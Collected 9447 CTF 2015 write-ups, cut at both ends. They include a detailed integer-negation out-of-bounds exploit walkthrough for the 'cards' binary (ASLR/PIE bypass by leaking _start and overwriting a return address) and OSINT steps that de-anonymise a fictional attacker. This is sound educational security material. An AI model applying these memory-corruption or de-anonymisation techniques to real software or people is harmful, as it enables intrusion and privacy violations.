1 (-) (-) 42 
Enter the index of the card to play:
3
You played 42, I played 1337
I won!
Here are your cards left:
1 (-) (-) (-) 
Enter the index of the card to play:
0
You played 1, I played 2
I won!
You got 1, I got 3
You didn't win, try harder next time :)
Lets play a game!
Enter up to 52 cards (0 to stop):
0
You need at least 1 card!
```

We can provide up to `52` cards, which are then shuffled using the [`shuffle`](https://github.com/pwning/public-writeup/blob/master/9447ctf2015/pwn140-cards/cards.c#L15-L28) function. After that, we can - in multiple rounds - pick cards by their index and whoever chooses the higher card wins.
If you win more rounds than the `cards` AI, `printFlag` is called.

However, you never can win, since the AI always chooses the [next higher card (if possible) in a sorted array](https://github.com/pwning/public-writeup/blob/master/9447ctf2015/pwn140-cards/cards.c#L79).
This leads us to the conclusion that we have to either find a vulnerability to get `RIP` control or call `printFlag()` in some other way.

To know which kind of vulnerabilities are possible, we have a look at `checksec`:

```bash
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Well... Everything is enabled and we guess ASLR is enabled, too. Looks difficult.

However, having a closer look at the `shuffle` function, we notice something interesting:

* At lines [`19-21`](https://github.com/pwning/public-writeup/blob/master/9447ctf2015/pwn140-cards/cards.c#L19-L21), it is checked if our given card value `val` - a `long long` - is negative. If so, it is inverted.
* At lines [`24-26`](https://github.com/pwning/public-writeup/blob/master/9447ctf2015/pwn140-cards/cards.c#L24-L26), the deck values at `deck[val%size]` and `deck[(i+1)%size]` are swapped

If you know how Two's complement work, you'll know that inverting [most negative number](https://en.wikipedia.org/wiki/Two%27s_complement#Most_negative_number) yields the same number again.

Why?

Let's say you have signed numbers starting from e.g. `-127` with binary representation `0111 1111` to `1` (`0000 0001`), `0` (`0000 0000`) and `-1` (`1111 1111`) to `-128` (`1000 0000`) as depicted in the wikipedia table.
Now if you invert a number with Two's complement, you'll essentially invert each bit of the given number, then add `1`. E.g. for `1`: 

* Invert `0000 0001` -> `1111 1110`
* Add `1`: `1111 1110` -> `1111 1111` (`-1`)

Now, you can invert all numbers from `-127` to `-1` and `1` to `127` without any problems. Inverting `0` works, too:

* Invert `0000 0000` -> `1111 1111`
* Add `1`: `1111 1111` -> `1 0000 0000`
* Throw away any carry bits (since your type can only hold 8 bits in this case): `1 0000 0000` -> `0000 0000` (`0`)

However, you also have `-128`, the most negative number. What happens with this number?

* Invert `1000 0000` -> `0111 1111`
* Add `1`: `0111 1111` -> `1000 0000` (`-128`)

Inverting the most negative number yields the same number again!

This means that `val % size` also becomes negative, creating negative indexes that allow us to access and swap data from outside our deck buffer! I think this is called an Integer Underflow or Overflow - Too lazy right now to look it up TODO :).

So if we provide the most negative number for a long long, so `0x8000 0000 0000 0000` = `-9223372036854775808`, we swap one of our provided numbers with index `-1`, our RIP address - making it one of our cards:

```bash
Lets play a game!
Enter up to 52 cards (0 to stop):
-9223372036854775808
1
2
0
Here are your cards left:
2 140735111657504 -9223372036854775808 
Enter the index of the card to play:
```

Let's set a breakpoint to [right after `shuffle`](https://github.com/pwning/public-writeup/blob/master/9447ctf2015/pwn140-cards/cards.c#L15) with `gdb-peda`:

```bash
gdb-peda$ b *shuffle
Breakpoint 1 at 0xa90
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/9447/cards 
Lets play a game!
Enter up to 52 cards (0 to stop):
4
5
6
0
[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x3 
RCX: 0x10 
RDX: 0x0 
RSI: 0x3 
RDI: 0x7fffffffe280 --> 0x4 
RBP: 0x7fffffffe280 --> 0x4 
RSP: 0x7fffffffe278 --> 0x555555554e62 (<handleRequests+82>:    mov    esi,ebx)
RIP: 0x555555554a90 (<shuffle>: xor    ecx,ecx)
R8 : 0x7ffff7dd4060 --> 0x7ffff7dd0d40 --> 0x7ffff7b9320e --> 0x2e2e00544d470043 ('C')
R9 : 0x7fffffffdd51 --> 0x600000000000000 
R10: 0x0 
R11: 0x0 
R12: 0x5555555548ea (<_start>:  xor    ebp,ebp)
R13: 0x7fffffffe520 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554a7f <readCards+111>:      pop    r13
   0x555555554a81 <readCards+113>:      ret    
   0x555555554a82:      data32 data32 data32 data32 nop WORD PTR cs:[rax+rax*1+0x0]
=> 0x555555554a90 <shuffle>:    xor    ecx,ecx
   0x555555554a92 <shuffle+2>:  test   esi,esi
   0x555555554a94 <shuffle+4>:  movsxd r10,esi
   0x555555554a97 <shuffle+7>:  mov    r8,rdi
   0x555555554a9a <shuffle+10>: jle    0x555555554ad7 <shuffle+71>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe278 --> 0x555555554e62 (<handleRequests+82>:   mov    esi,ebx)
0008| 0x7fffffffe280 --> 0x4 
0016| 0x7fffffffe288 --> 0x5 
0024| 0x7fffffffe290 --> 0x6 
0032| 0x7fffffffe298 --> 0x5 
0040| 0x7fffffffe2a0 --> 0xa ('\n')
0048| 0x7fffffffe2a8 --> 0x7fffffffe428 --> 0x0 
0056| 0x7fffffffe2b0 --> 0x7fffffffe400 --> 0x7ffff7fd9740 (0x00007ffff7fd9740)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554a90 in shuffle ()
gdb-peda$ x/20gx $rsp
0x7fffffffe278: 0x0000555555554e62      0x0000000000000004
0x7fffffffe288: 0x0000000000000005      0x0000000000000006
0x7fffffffe298: 0x0000000000000005      0x000000000000000a
0x7fffffffe2a8: 0x00007fffffffe428      0x00007fffffffe400
0x7fffffffe2b8: 0x00007fffffffe460      0x0000000000000000
0x7fffffffe2c8: 0x00007ffff7ffeae8      0x00007ffff7ffe760
0x7fffffffe2d8: 0x00007ffff7de4991      0x0000000000000000
0x7fffffffe2e8: 0x00007fffffffe460      0x0000000000000000
0x7fffffffe2f8: 0x0000000000000000      0x00007fff00000000
0x7fffffffe308: 0x00007ffff7ffe760      0x0000000000000000
```

Looks like the address before our first input (index `0`) is the return address / our `RIP` - index `-1` - at offset `0x00000e62`:

![](./shuffle-ret.png)

However, if we try to access this address, we also automatically overwrite it, crashing our program. (TODO Didn't happen locally - maybe I am wrong here)

So, we have to find another address that contains our process individual base and calculate the address for `printFlag()` from that to defeat `ASLR` plus `PIE`.

Let's see what indexes we can create (copied from [this writeup](http://secgroup.github.io/2015/11/30/9447ctf2015-writeup-cards/):

```bash
1,  0
 3, -2
 5, -3
 7, -1
 9, -8
17, -9
19, -18
27, -26
29, -12
37, -6
43, -42
47, -36
48, -32
```

Let's have a look at each of these negative indexed:

```bash
0x7fffffffe278: 0x0000555555554e62
gdb-peda$ x/i 0x0000555555554e62
   0x555555554e62 <handleRequests+82>:  mov    esi,ebx
gdb-peda$ x/gx $rsp+0x8-0x8*2
0x7fffffffe270: 0x00007fffffffe520
gdb-peda$ x/gx $rsp+0x8-0x8*3
0x7fffffffe268: 0x00005555555548ea
gdb-peda$ x/i 0x00005555555548ea
   0x5555555548ea <_start>:     xor    ebp,ebp
gdb-peda$ x/gx $rsp+0x8-0x8*6
0x7fffffffe250: 0x0000555555555038
gdb-peda$ x/i 0x0000555555555038
   0x555555555038:      rex.RB outs dx,BYTE PTR ds:[rsi]
gdb-peda$ x/gx $rsp+0x8-0x8*8
0x7fffffffe240: 0x00007ffff7dd4400
gdb-peda$ x/gx $rsp+0x8-0x8*9
0x7fffffffe238: 0x0000555555554a52
gdb-peda$ x/i 0x0000555555554a52
   0x555555554a52 <readCards+66>:       mov    rdx,QWORD PTR [rsp+0x8]
gdb-peda$ x/gx $rsp+0x8-0x8*12
0x7fffffffe1f0: 0x0000000000000001
gdb-peda$ x/gx $rsp+0x8-0x8*18
0x7fffffffe1c0: 0x00007fffffffe300
gdb-peda$ x/gx $rsp+0x8-0x8*26
0x7fffffffe150: 0x00007fff00000000
gdb-peda$ x/gx $rsp+0x8-0x8*32
0x7fffffffe0f0: 0x0000000000000000
gdb-peda$ x/gx $rsp+0x8-0x8*36
0x7fffffffe0d0: 0x00007fffffffe298
gdb-peda$ x/gx $rsp+0x8-0x8*42
0x7fffffffe070: 0x00007fffffffe1c0
```

As we can see, index `-3` points at `_start`, which calls our `__libc_start_main`:

![](./start.png)

All that is left to do is leak the address for `_start` and thus our base address in a first round, calculate the address for `printFlag()` from that and overwrite `shuffle`'s `RIP` with that address.

[This python script](./solve.py) does the job:

```bash
$ p solve.py 
[+] Started program './cards'
[*] round 1: 1 1 -9223372036854775808 1 140142452812010 
[*] addr_start: 0x7f75751e28ea
[*] addr_printflag: 0x7f75751e2d90
[+] Recieving all data: Done (68B)
[*] Program './cards' stopped with exit code -11
[*] Flag: 9447{ThE_Only_w1nn1Ng_M0ve_1S_t0_stEAl_The_flAg}
```

The flag is `9447{ThE_Only_w1nn1Ng_M0ve_1S_t0_stEAl_The_flAg}`.

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn140-cards>
* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-02-exploit-02-cards-md>
* <https://www.whitehatters.academy/9447-ctf-exploit-cards/>
* <https://wiki.inpt.fr/ctf:public:9447:cards> or <https://pony7.fr/ctf:public:9447:cards>
* <http://secgroup.github.io/2015/11/30/9447ctf2015-writeup-cards/>
* <http://andrewdutcher.com/helium/9447-15-writeup/index.html>
* <https://kt.pe/blog/2015/12/9447ctf-2015-quals/#cards>
# 9447 CTF 2015: ctfzip

**Category:** Exploitation
**Points:** 320
**Solves:** 1
**Description:**

> Compress all your flags here!
>
>
> ctfzip-9xhjgvgt.9447.plumbing port 9447
>
> [ctfzip](./ctfzip-ada7da403d4943369e66d388808f8df3)  ada7da403d4943369e66d388808f8df3


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 9447 CTF 2015: PwnOs

**Category:** Exploitation
**Points:** 380
**Solves:** 0
**Description:**

> Use the same files as in RedOs
> 
> Find the flag is on the first sector of the first hard drive. Good luck.
> 
> It is running on os-uedhyevi.9447.plumbing port 9447


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 9447 CTF 2015: RedOs

**Category:** Exploitation
**Points:** 160
**Solves:** 19
**Description:**

> Here are some files to help you along.
>
>  Find the flag from /ctf/level2.server
> 
>  There is a sample client in /ctf/level2.client (you may need to write your own)
> 
>  It is running on os-uedhyevi.9447.plumbing port 9447
> 
> [9447_os_task_package.tar.gz](./9447_os_task_package-a6151c7dcea0da2d569d5ca81b5db79e.tar.gz)  a6151c7dcea0da2d569d5ca81b5db79e


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-02-exploit-05-redos-md>
* <http://andrewdutcher.com/helium/9447-15-writeup/index.html>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn160-redos>
# 9447 CTF 2015: Search Engine

**Category:** Exploitation
**Points:** 230
**Solves:** 5
**Description:**

>  Ever wanted to search through real life? Well this won't help, but it will let you search strings.
> 
>  Find it at search-engine-qgidg858.9447.plumbing port 9447.
> 
> [search](./search-bf61fbb8fa7212c814b2607a81a84adf)  bf61fbb8fa7212c814b2607a81a84adf


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn230-search>
* <http://rex.sex/ctf/2015/9447/search_engine/search.py> (@rex2er)
# 9447 CTF 2015: WtfOs

**Category:** Exploitation
**Points:** 360
**Solves:** 12
**Description:**

>  Use the same files as in RedOs
> 
>  Find the flag from level3.
> 
>  It is running on os-uedhyevi.9447.plumbing port 9447
> 
>  Hint! It would be a shame if the flag wasn't actually cleared from memory, wouldn't it?
> 
>  Hint! Can you see any way that a usermode program can ask for more memory?
> 
>  Hint: the topbar information, about pages free/allocated/somerandomcounter may be useful.


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-02-exploit-06-wtfos-md>
* <http://andrewdutcher.com/helium/9447-15-writeup/index.html>
# 9447 CTF 2015: 4w1h

**Category:** Misc
**Points:** 100
**Solves:** 113
**Description:**

> where in the world is 9447 ctf?
>
> Flag is in format 9447{<string>}, where <string> is derived from the images. It is in uppercase.
>
> Hint! The flag is made up of the direction each image is looking in, like 9447{NWSE}
>
> Hint! The direction is like S, NE
>
> [directions.tar.gz](https://mega.nz/#!PFl2jZQA!_1OUZ73gpaxWpPVXzdtWrw6VR_7mwH7uWoMYKtSoNZo)  98ca57f494014e6dbdfc9ae2933458bf


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-11-28-9447/4w1h#eng-version>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/misc100-4w1h>
* [Spanish](http://mumei.strangled.net/post/5)
* [b01lers](https://b01lers.net/challenges/9447%20CTF%202015/4w1h/80/)
* [sophia.re](http://www.sophia.re/4w1h.mdown.html)
# 9447 CTF 2015: ctfclicker

**Category:** Misc
**Points:** 220
**Solves:** 4
**Description:**

>  Check out this game we made for the ctf!
> 
>  Find it at ctfclicker-oi4sadj3as.9447.plumbing port 9447.
> 
>  Find out more about scrypt at <http://www.tarsnap.com/scrypt.html>
> 
>  [ctfclicker](./ctfclicker-999f6495d3c3914a33db406ced6baecb)  999f6495d3c3914a33db406ced6baecb
> 
>  [ctfclicker32](./ctfclicker32-17a4bb9314795f792c936bcc3eac4976)  17a4bb9314795f792c936bcc3eac4976


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/misc220-ctfclicker>
* <http://ohaithe.re/post/134755783432/ctfclicker-writeup-9447-ctf>
# 9447 CTF 2015: Get help

**Category:** Misc
**Points:** 10
**Solves:** 314
**Description:**

> Where would you go to get help?


## Write-up

Go to #9447CTF on irc.freenode.net. The flag is in the IRC channel's topic.

## Other write-ups and resources

* <http://rotiples.tistory.com/42>
* <https://gist.github.com/Invizory/1c2b4fb9a1edba86fac9>
* <http://www.sophia.re/94472015_gethelp_writeup.html>
# 9447 CTF 2015: Give Feedback

**Category:** Misc
**Points:** 15
**Solves:** 216
**Description:**

> Give feedback (15pts)
> 
>  40 minutes remaining
> 
>  We have a short survey about the competition, and would love some feedback.
> 
>  Find it at <https://docs.google.com/forms/d/1Z7rP_YHQXx1Aed0MQYscIHFM0MBXyq8aUQm9dSOEK8Y/viewform>
> 
>  Thanks for taking the time to fill it out, it will help us improve for next year. You'll get the flag when you complete it.
> 
>  Good luck for the remaining time!
> 


## Write-up

9447{Thanks_for_the_feedback}

“We gave our thoughts. At the end of the survey, there was something that looked like a flag. Wow, it was! ~ :D “

## Other write-ups and resources

* none yet
# 9447 CTF 2015: Recon 1

**Category:** Misc
**Points:** 140
**Solves:** 85
**Description:**

> Someone has attacked your site. We have attached a log collected from the time of the attack.
> 
> This task is split into two parts. The end goal (Recon 2) is to find the full name of the attacker.
> 
> The flag for Recon 1 is not the name of the attacker. Recon 1 flag will appear as 9447{...} on your screen when you find it.
> 
> Hint! The attacker has gone on vacation, and won't be reading or responding to emails. You do not need to email anyone for this challenge.
> 
> [log.tar.gz](./log-8dbfb01501680891caf2dc03252b951e.tar.gz)  8dbfb01501680891caf2dc03252b951e


## Write-up

by [allfro](https://github.com/allfro)

1. Inspecting the log reveals two IP addresses `37.139.17.15` and `192.241.254.77`. 
2. `192.241.254.77` resolves to `www.williestoleyour.pw`. 
3. Opening your web browser and navigating to `http://www.williestoleyour.pw` reveals an email address in the body of the website: `info@williestoleyour.pw`. 
4. Going to `http://archive.org` and entering `http://www.williestoleyour.pw` in the search bar reveals that an older version of the website is available for viewing from November 11th, 2015.
5. Viewing the older website `https://web.archive.org/web/20151115002534/http://www.williestoleyour.pw/` reveals a second email: `info@dynamiclock.pw`
6. Navigating to `http://dynamiclock.pw` in your web browser you see the flag `9447{YouAreStalKey}`

## Other write-ups and resources

* <https://github.com/philo0x90/CTF-write-ups/blob/master/9447-ctf-2015/misc-recon1.md>
* <http://corb3nik.github.io/2015/11/29/9447-recon-1/>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/misc140-recon1>
* <https://gist.github.com/Invizory/2905c34fe4d2a885efec>
* [sophia.re](http://www.sophia.re/94472015_recon12_writeup.html)
# 9447 CTF 2015: Recon 2

**Category:** Misc
**Points:** 190
**Solves:** 32
**Description:**

> Find the attackers full name. See attached file on Recon 1.
> 
> The format of the flag is 9447{firstname.lastname}. It will be obvious when you've found the name.


## Write-up

by [allfro](https://github.com/allfro)

1. An `nslookup` reveals that `http://dynamiclock.pw` is sitting behind CloudFlare.
2. At the bottom of the page there is a "Contact Me" form that allows you to fill in your email address, name, and a comment.
3. By filling in the form successfully with a valid email address you should receive an email confirmation from the server itself.
4. Inspecting the email's metadata, you find the real IP address of the server: `162.243.7.88`
5. Navigating to `http://162.243.7.88` in a web browser reveals a directory listing containing a contact card: `dynamicWarl0ck.vcf`
6. Using a service like `http://checkusernames.com/` you look for the availability of `dynamicWarl0ck` on different social networks.
7. Noticing that `github.com` is unavailable, you navigate to `https://github.com/dynamicWarl0ck` where in the comments it says that the account was moved to bitbucket
8. Going to `https://bitbucket.org/dynamicWarl0ck/` you see the user has one repo: `dynamics`
9. Browsing the repo you notice one commit with the comment `add key`.
10. Once at the commit (`https://bitbucket.org/dynamicWarl0ck/dynamics/commits/63614345e143579befcb3b2dff1d9e9740598d10`) the flag will appear `nine four four seven lbrace william.clutterbuck rbrace` in the diffs.

## Other write-ups and resources

* <http://corb3nik.github.io/2015/11/29/9447-recon-2/>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/misc190-recon2>
* [sophia.re](http://www.sophia.re/94472015_recon12_writeup.html)
# 9447 CTF 2015 write-ups

* <https://9447.plumbing>
* [Scoreboard](https://9447.plumbing/scores) or [local alternative](scoreboard)
* [Sources for all challenges](https://s3-us-west-2.amazonaws.com/public.files.9447.plumbing/9447ctf2015-release.tar.gz)
* Participants: 1136

## Completed write-ups

* [exploitation/calcpop](exploitation/calcpop)
* [exploitation/cards](exploitation/cards)
* [misc/get-help](misc/get-help)
* [misc/give-feedback](misc/give-feedback)
* [misc/recon-1](misc/recon-1)
* [misc/recon-2](misc/recon-2)
* [reversing/flag-finder](reversing/flag-finder)
* [reversing/the-real-flag-finder](reversing/the-real-flag-finder)
* [steganography/binned](steganography/binned)
* [steganography/gife-up-now](steganography/gife-up-now)
* [steganography/imaged](steganography/imaged)
* [web/premonition](web/premonition)
* [web/super-turbo-atomic-gif-converter](web/super-turbo-atomic-gif-converter)
* [web/yws](web/yws)

## External write-ups only

* [crypto/dub-key](crypto/dub-key)
* [crypto/fibbed](crypto/fibbed)
* [crypto/randbox](crypto/randbox)
* [crypto/wob-key](crypto/wob-key)
* [crypto/wob-key-hard](crypto/wob-key-hard)
* [exploitation/bws](exploitation/bws)
* [exploitation/calpop-reloaded](exploitation/calpop-reloaded)
* [exploitation/redos](exploitation/redos)
* [exploitation/search-engine](exploitation/search-engine)
* [exploitation/wtfos](exploitation/wtfos)
* [misc/4w1h](misc/4w1h)
* [misc/ctfclicker](misc/ctfclicker)
* [reversing/0ldskoo1](reversing/0ldskoo1)
* [reversing/danklang](reversing/danklang)
* [reversing/hello-joe](reversing/hello-joe)
* [reversing/nobranch](reversing/nobranch)
* [web/nicklesndimes](web/nicklesndimes)
* [web/sanutf8y-check](web/sanutf8y-check)

## Missing write-ups

* [exploitation/ctfzip](exploitation/ctfzip)
* [exploitation/pwnos](exploitation/pwnos)# 9447 CTF 2015: 0ldskoo1

**Category:** Reversing
**Points:** 180
**Solves:** 5
**Description:**

>  THE MACHINE FORGOTTEN
> 
>  (if you're not 0ldskoo1, see <http://nonmame.retrogames.com/)>
> 
>  Hint! <https://github.com/espes/xqemu/wiki/Getting-Started>
> 
>  PROTIP: You can nag the author on IRC if it doesn't work!
> 
>  [0ldskoo1.iso](./0ldskoo1-954d634c4e7cec019eef84aa232325aa.iso)  954d634c4e7cec019eef84aa232325aa


## Write-up

(TODO)

## Other write-ups and resources

* <https://lf.lc/ctf/2015-11-29-9447-0ldskoo1>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/re180-0ldskoo1>
# 9447 CTF 2015: danklang

**Category:** Reversing
**Points:** 100
**Solves:** 78
**Description:**

>  if you see this task while scroling
>
>  you have been visited by the reversing task of the 9447 ctf
>
>  good flags and points will come to you
>
>  but only if you submit '9447{`dankcode main.dc`}' to this task.
>
> [main.dc](./main-5c146bdc240527609ffcf236d04be83b.dc)  5c146bdc240527609ffcf236d04be83b


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/hypnosec/writeups/blob/master/2015/9447-ctf/reversing/danklang.md>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/re100-danklang>
* <https://gist.github.com/zzoru/c0991d5e24c4b17a55cb>
* <http://pastebin.com/1pwA4SU9>
* <https://gist.github.com/auscompgeek/d13d5d6c402de7e3bee7>
* [Danklang Interpreter](https://github.com/jfeng41/greentext)
* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-01-re-03-danklang-md>
* [b01lers](https://b01lers.net/challenges/9447%20CTF%202015/darklang/79/)
* <https://github.com/p4-team/ctf/tree/master/2015-11-28-9447/danklang#eng-version>
* <https://github.com/ubuntor/misc_writeups/tree/master/9447ctf2015>
# 9447 CTF 2015: flag-finder

**Category:** Reversing
**Points:** 1
**Solves:** 434
**Description:**

> I've forgotten my flag. I remember it has the format "9447{<some string>}", but what could it be?
> 
> This task is sadly broken (it is too easy).
> 
> [I_Are_Sad_Kitten.jpg](./I_Are_Sad_Kitten.jpg)
> 
> [flagfinder](./flagfinder-bbc6305273a39e9ccd751c24df86ac61)  bbc6305273a39e9ccd751c24df86ac61


## Write-up

Just running the binary yields the flag:

```bash
$ ./flagfinder-bbc6305273a39e9ccd751c24df86ac61 
Usage: ./flagfinder-bbc6305273a39e9ccd751c24df86ac61 <password>
$ ./flagfinder-bbc6305273a39e9ccd751c24df86ac61 1
Try again
9447{C0ngr47ulaT1ons_p4l_buddy_y0Uv3_solved_the_H4LT1N6_prObL3M_n1c3_} 1000024
```

## Other write-ups and resources

* <http://rotiples.tistory.com/43>
* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-01-re-01-flag-finder-md>
* <https://github.com/ubuntor/misc_writeups/tree/master/9447ctf2015>
# 9447 CTF 2015: Hello, Joe

**Category:** Reversing
**Points:** 160
**Solves:** 68
**Description:**

>  It's-a me, Mario!
> 
>  We're there. All I can see are turtle tracks. Whaddaya say we give Bowser the old Brooklyn one-two?
> 
> [hellojoe](./hellojoe-d4fc787734bc9d0fb867aa7ade904f07)  d4fc787734bc9d0fb867aa7ade904f07


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/re160-hello-joe>
* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-01-re-04-hello-joe-md>
* <http://ohaithe.re/post/134749034617/hellojoe-writeup-9447-ctf>
# 9447 CTF 2015: nobranch

**Category:** Reversing
**Points:** 330
**Solves:** 6
**Description:**

> $ ./nobranch `cat flag.txt`
> 
> HMQhQLi6VqgeOj78AbiaqquK3noeJt
> 
> [nobranch](./nobranch-d0c4a08a7e72bfb81250f2127841b28f)  d0c4a08a7e72bfb81250f2127841b28f


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/re330-nobranch>
* <https://github.com/angr/angr-doc/blob/master/examples/9447_nobranch/solve.py>
# 9447 CTF 2015: The *real* flag finder

**Category:** Reversing
**Points:** 70
**Solves:** 233
**Description:**

>  I've forgotten my flag. I remember it has the format "9447{<some string>}", but what could it be?
>
>  Unfortunately the program no longer just prints the flag.
>
> [flagFinderRedux](./flagFinderRedux-e72e7ac9b16b8f40acd337069f94d524)  e72e7ac9b16b8f40acd337069f94d524


## Write-up

by [polym](https://github.com/abpolym)

Keywords:

* `xor`
* `x86-64`
* `anti-debug`
* `input=flag`

We are given a x86-64 Binary for Linux:

```bash
flagFinderRedux-e72e7ac9b16b8f40acd337069f94d524: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=8c0c9c0d5c39ff0cc1954fa8682288b6169b8fff, stripped
```

Running the binary:

```
$ ./flagFinderRedux-e72e7ac9b16b8f40acd337069f94d524 
Usage: ./flagFinderRedux-e72e7ac9b16b8f40acd337069f94d524 <password>
$ ./flagFinderRedux-e72e7ac9b16b8f40acd337069f94d524 password
Try again
```

First, we list all functions using radare2:

![](./r2-f.png)

We see our main at address `0x0040063e` and two other functions.

Displaying the graph for our main with `VV @ main` shows us several calls to `memcmp`, `puts`, `printf` and `strcpy`:

![](./r2-main.png)

We also can see a xor at address `0x00400787` with two different operands, hinting at the use of xor-encryption.

Our last result when running the binary was ''Try again'', which is printed in node `0x400751`.
Instead of landing in this node, we want to our program to step into the node `0x400732`, which depends on the `memcmp` call at address `0x00400729`.

Setting a breakpoint at this address with `gdb-peda` yields the flag:

![](./gdb-breakpoint.png)

Looks like our flag was the input/password: `9447{C0ngr47ulaT1ons_p4l_buddy_y0Uv3_solved_the_re4l__H4LT1N6_prObL3M}`

Notes:

* Some anti-debug stuff is going on in nodes `0x4006f2` and `0x40075d` as explained [here](https://b01lers.net/challenges/9447%20CTF%202015/FlagFinder/77/)
* IDA Pro can decompile this binary to readable C-Code as done [here](https://github.com/ByteBandits/writeups/tree/master/9447-2015/reversing/The%20*real*%20flag%20finder/sudhackar)

## Other write-ups and resources

* <http://rotiples.tistory.com/44>
* <https://gist.github.com/xyzz/9a5511ffa1ade17e7359#file-01-re-02-real-flag-finder-md>
* <https://github.com/ByteBandits/writeups/tree/master/9447-2015/reversing/The%20*real*%20flag%20finder/sudhackar>
* [b01lers](https://b01lers.net/challenges/9447%20CTF%202015/FlagFinder/77/)
* <https://github.com/ubuntor/misc_writeups/tree/master/9447ctf2015>
# 9447 CTF 2015: binned

**Category:** Steganography
**Points:** 100
**Solves:** 12
**Description:**

>  We noticed this binary running in prod. Can you find out what it is hiding?
> 
> [binned.tar.gz](./binned-c442ae4618641dec71eecfa241c1d7d6.tar.gz)  c442ae4618641dec71eecfa241c1d7d6


## Write-up

by [polym](https://github.com/abpolym)

After extracting the file using `tar xvf <binned>`, we have a look at what kind of file we are dealing with using `file`:

	+bash-4.3$ file binned
	binned: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped

After that, we run it in a VM and get following:

	+bash-4.3$ cat ~/vboxshare/output 
	vbox@vbox:/tmp$ ./binned 
	Begin working out flag...
	Flag worked out!

Hmm, looks like everything worked so far. Let's throw in `strace` and `ltrace` to see what it is doing. Output is in [binned-strace](./binned-strace) and [binned-ltrace](./binned-ltrace).

It looks like the program calls unrelated functions like `shutdown`, `rmdir`, `capget` etc.

The clue here is that the author encoded a message using the 64-bit syscall numbers of each syscall.
We can get a list looking at a [syscall table](http://lxr.free-electrons.com/source/arch/x86/syscalls/syscall_64.tbl?v=3.14).
A parseable table is [here](./syscall-64.list).

Using [this program](./syscall-stego.py), we finally get the flag:

![](./flag.png)


## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/steg100-binned>
* <https://github.com/ubuntor/misc_writeups/tree/master/9447ctf2015/binned>
# 9447 CTF 2015: gife cp now

**Category:** Steganography
**Points:** 170
**Solves:** 8
**Description:**

>  See title
> 
>  Hint! For this challenge, one of the qr's is incorrect. It should read '}' instead of '{'
> 
>  Hint! The timing is important. What code uses timing?
> 
>  If it's ambiguous, perhaps a subset of the characters will help.
> 
>  Hint! There was an error with gife up now. It has been corrected. Please download the new gif.
> 
>  Hint! Updated once more. This time is *almost certainly* correct.
> 
> [gife.gif](./gife-489b98cd6221896fa3d10c6dc51e2fb5.gif)  489b98cd6221896fa3d10c6dc51e2fb5


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on two writeups. One by [PPP](https://github.com/pwning/public-writeup/tree/master/9447ctf2015/steg170-gife-up-now) and one by [sophia.re](http://www.sophia.re/94472015_gifeupnow_writeup.html).

We are given a gif that displays several QR codes in succession:

![](./gife-489b98cd6221896fa3d10c6dc51e2fb5.gif)

The first thing we can do is split the gif into its individual frames using ImageMagick's `convert`:

```bash
+bash-4.3$ convert gife-489b98cd6221896fa3d10c6dc51e2fb5.gif pics/target.png
+bash-4.3$ tree pics
pics
├── target-0.png
├── target-1.png
├── target-10.png
├── target-11.png
├── target-12.png
[...]
├── target-87.png
├── target-88.png
└── target-9.png

0 directories, 89 files
```

Afterwards we can decode the QR codes in a simple manner with [this python script](./qrdecode.py) that uses a python library named `zbarlight`:

```bash
+bash-4.3$ for i in {0..88}; do python2.7 qrdecode.py pics/target-$i.png; done
pics/target-0.png ['two']
pics/target-1.png ['parts']
pics/target-2.png None
pics/target-3.png None
pics/target-4.png None
pics/target-5.png None
pics/target-6.png None
pics/target-7.png None
pics/target-8.png ['lower']
pics/target-9.png None
pics/target-10.png None
[...]
ics/target-80.png None
pics/target-81.png ['faucet']
pics/target-82.png None
pics/target-83.png None
pics/target-84.png None
pics/target-85.png None
pics/target-86.png None
pics/target-87.png None
pics/target-88.png None
```

There are several images that can't be decoded.
Some are just plain white frames, such as `target-10.png` and others just overlay parts of previous frames (Please correct if I am wrong) and are missing some rows, such as `target-85.png`:

![](./target-85.png)

We fix the broken QR codes by hand and move the non-white QR codes to another directory for another decoding run:

```bash
+bash-4.3$ mkdir targets
